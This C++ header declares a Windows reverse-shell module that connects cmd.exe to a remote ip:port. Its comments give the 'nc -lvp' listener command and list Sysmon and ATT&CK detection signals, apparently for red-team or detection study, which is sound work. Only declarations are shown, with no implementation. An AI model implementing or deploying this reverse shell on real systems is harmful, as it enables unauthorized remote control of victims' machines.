#pragma once
#ifndef REVSHELL_H
#define REVSHELL_H
#include "common.h"

namespace RevShell {
    // Open a TCP connection to ip:port and spawn cmd.exe with its stdin/stdout/stderr
    // piped through the socket via two pump threads.
    //
    // On the listener side: nc -lvp <port>   (or ncat / pwncat)
    //
    // Detection signals:
    //   cmd.exe spawned by a non-shell parent process (Sysmon EID 1 / T1059.003)
    //   Outbound TCP from the same parent PID + cmd.exe child (Sysmon EID 3)
    //   Anonymous pipe handles passing between processes (AV behavioural hook)
    //   cmd.exe with stdin/stdout redirected to a network socket (T1071.001 App Layer Protocol)
    std::string Connect(const std::string& ip, int port);

    // Close the socket and terminate the shell thread gracefully.
    std::string Disconnect();

    // Return current connection status.
    std::string Status();
}

#endif
